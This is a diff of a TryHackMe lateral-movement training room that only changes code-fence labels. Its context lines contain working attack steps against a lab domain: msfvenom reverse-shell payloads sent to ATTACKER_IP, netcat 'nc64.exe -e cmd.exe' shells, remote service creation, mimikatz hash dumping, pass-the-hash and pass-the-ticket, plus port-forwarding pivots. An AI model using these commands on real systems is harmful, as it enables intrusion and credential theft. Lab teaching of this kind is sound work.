@@ -38,7 +38,7 @@ In this room, we will look at lateral movement, a group of techniques used by at
  If you are using the Web-based AttackBox, you will be connected to the network automatically if you start the AttackBox from the room's page. You can verify this by running the ping command against the IP of the THMDC.za.tryhackme.com host. We do still need to configure DNS, however. Windows Networks use the Domain Name Service (DNS) to resolve hostnames to IPs. Throughout this network, DNS will be used for the tasks. You will have to configure DNS on the host on which you are running the VPN connection. In order to configure our DNS, run the following command:
 
    Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
 ```
 
@@ -60,7 +60,7 @@ In this room, we will look at lateral movement, a group of techniques used by at
 Use an OpenVPN client to connect. This example is shown on a Linux machine; similar guides to connect using Windows or macOS can be found at your [access](https://tryhackme.com/r/access) page.
 
    Terminal 
-```Terminal 
+```bash
 [thm@thm]$ sudo openvpn user-lateralmovementandpivoting.ovpn
 Fri Mar 11 15:06:20 2022 OpenVPN 2.4.9 x86_64-redhat-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Apr 19 2020
 Fri Mar 11 15:06:20 2022 library versions: OpenSSL 1.1.1g FIPS  21 Apr 2020, LZO 2.08
@@ -311,14 +311,14 @@ To create a reverse shell, we can use the following command:
 **Note:**  Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myservice.exe" to avoid overwriting someone else's payload.
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
 ```
 
    We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
  putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
 ```
@@ -326,7 +326,7 @@ user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//
    Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfconsole
 msf6 > use exploit/multi/handler
 msf6 exploit(multi/handler) > set LHOST lateralmovement
@@ -340,14 +340,14 @@ msf6 exploit(multi/handler) > exploit
    Alternatively, you can run the following one-liner on your Linux console to do the same:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
 ```
 
    Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use `runas` to spawn a new shell with t1_leonard.summer's access token. Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but we would have no access to it. To overcome this problem, we can use runas to spawn a second reverse shell with t1_leonard.summers access token:
 
     THMJMP2: Command Prompt  
-```THMJMP2: Command Prompt 
+```bash
 C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
 ```
 
@@ -356,7 +356,7 @@ C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe
 We can receive the reverse shell connection using nc in our AttackBox as usual:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 4443
 ```
 
@@ -365,7 +365,7 @@ user@AttackBox$ nc -lvp 4443
 And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:
 
     THMJMP2: Command Prompt (As t1_leonard.summers)  
-```THMJMP2: Command Prompt (As t1_leonard.summers) 
+```bash
 C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
 C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```
@@ -548,14 +548,14 @@ We'll show how to use those credentials to move laterally to THM-IIS using WMI a
  **Note:**  Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myinstaller.msi" to avoid overwriting someone else's payload.
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
 ```
 
    We then copy the payload using SMB or any other method available:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
  putting file myinstaller.msi as \myinstaller.msi (0.0 kb/s) (average 0.0 kb/s)
 ```
@@ -565,7 +565,7 @@ user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//
  We start a handler to receive the reverse shell from Metasploit:
 
     AttackBox  
-```AttackBox 
+```bash
 msf6 exploit(multi/handler) > set LHOST lateralmovement
 msf6 exploit(multi/handler) > set LPORT 4445
 msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
@@ -577,7 +577,7 @@ msf6 exploit(multi/handler) > exploit
    Let's start a WMI session against THMIIS from a Powershell console:
 
     THMJMP2: Powershell  
-```THMJMP2: Powershell 
+```bash
 PS C:\> $username = 't1_corine.waters';
 PS C:\> $password = 'Korine.1994';
 PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
@@ -589,7 +589,7 @@ PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credent
    We then invoke the Install method from the Win32_Product class to trigger the payload:
 
     THMJMP2: Powershell  
-```THMJMP2: Powershell 
+```bash
 PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 ```
 
@@ -640,7 +640,7 @@ To extract NTLM hashes, we can either use mimikatz to read the local SAM or extr
  This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
 
     THMJMP2: Powershell  
-```THMJMP2: Powershell 
+```bash
 mimikatz # privilege::debug
 mimikatz # token::elevate
 
@@ -655,7 +655,7 @@ User : Administrator
  This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
 
     THMJMP2: Powershell  
-```THMJMP2: Powershell 
+```bash
 mimikatz # privilege::debug
 mimikatz # token::elevate
 
@@ -689,7 +689,7 @@ This would be the equivalent of using `runas /netonly` but with a hash instead o
  To receive the reverse shell, we should run a reverse listener on our AttackBox:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 5555
 ```
 
@@ -764,7 +764,7 @@ mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHAC
  Injecting tickets in our own session doesn't require administrator privileges. After this, the tickets will be available for any tools we use for lateral movement. To check if the tickets were correctly injected, you can use the klist command:
 
     THMJMP2: Powershell  
-```THMJMP2: Powershell 
+```bash
 za\bob.jenkins@THMJMP2 C:\> klist
 
 Current LogonId is 0:0x1e43562
@@ -825,7 +825,7 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b5
  To receive the reverse shell, we should run a reverse listener on our AttackBox:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ nc -lvp 5556
 ```
 
@@ -912,7 +912,7 @@ PsExec64.exe -s cmd.exe
 To list the existing sessions on a server, you can use the following command:
 
     Command Prompt  
-```Command Prompt 
+```bash
 C:\> query user
  USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 >administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
@@ -989,7 +989,7 @@ passwd tunneluser
  Referring to the previous image, to forward port 3389 on the server back to our attacker's machine, we can use the following command on PC-1:
 
     PC1: Command Prompt  
-```PC1: Command Prompt 
+```bash
 C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
 ```
 
@@ -1002,7 +1002,7 @@ Since the `tunneluser` isn't allowed to run a shell on the Attacker PC, we need 
  Once our tunnel is set and running, we can go to the attacker's machine and RDP into the forwarded port to reach the server:
 
     Attacker's Machine  
-```Attacker's Machine 
+```bash
 munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
 ```
 
@@ -1017,7 +1017,7 @@ munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
  To forward port 80 from the attacker's machine and make it available from PC-1, we can run the following command on PC-1:
 
     PC1: Command Prompt  
-```PC1: Command Prompt 
+```bash
 C:\> ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
 ```
 
@@ -1048,7 +1048,7 @@ socat TCP4-LISTEN:1234,fork TCP4:1.1.1.1:4321
  Coming back to our example, if we wanted to access port 3389 on the server using PC-1 as a pivot as we did with SSH remote port forwarding, we could use the following command:
 
     PC-1: Command Prompt  
-```PC-1: Command Prompt 
+```bash
 C:\>socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
 ```
 
@@ -1066,7 +1066,7 @@ netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow pr
  If, on the other hand, we'd like to expose port 80 from the attacker's machine so that it is reachable by the server, we only need to adjust the command a bit:
 
     PC-1: Command Prompt  
-```PC-1: Command Prompt 
+```bash
 C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
 ```
 
@@ -1081,7 +1081,7 @@ C:\>socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
 Since we don't want to rely on an SSH server existing on the Windows machines in our target network, we will normally use the SSH client to establish a reverse dynamic port forwarding with the following command:
 
     PC1: Command Prompt  
-```PC1: Command Prompt 
+```bash
 C:\> ssh tunneluser@1.1.1.1 -R 9050 -N
 ```
 
@@ -1117,7 +1117,7 @@ To complete this exercise, you will need to connect to THMJMP2 using the credent
 To do so, we will run socat with the following parameters:
 
     THMJMP2: Command Prompt  
-```THMJMP2: Command Prompt 
+```bash
 C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
 ```
 
@@ -1126,7 +1126,7 @@ C:\tools\socat\>socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
 Once the listener has been set up, you should be able to connect to THMIIS via RDP from your attacker machine by pivoting through your socat listener at THMJMP2:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ xfreerdp /v:THMJMP2.za.tryhackme.com:13389 /u:t1_thomas.moore /p:MyPazzw3rd2020
 ```
 
@@ -1153,7 +1153,7 @@ To forward such ports from our attacker machine to THMJMP2, we will use local po
 Putting the whole command together, we would end up with the following:
 
     THMJMP2: Command Prompt  
-```THMJMP2: Command Prompt 
+```bash
 C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N
 ```
 
@@ -1164,7 +1164,7 @@ C:\> ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.
 Once all port forwards are in place, we can start Metasploit and configure the exploit so that the required ports match the ones we have forwarded through THMJMP2:
 
     AttackBox  
-```AttackBox 
+```bash
 user@AttackBox$ msfconsole
 msf6 > use rejetto_hfs_exec
 msf6 exploit(windows/http/rejetto_hfs_exec) > set payload windows/shell_reverse_tcp
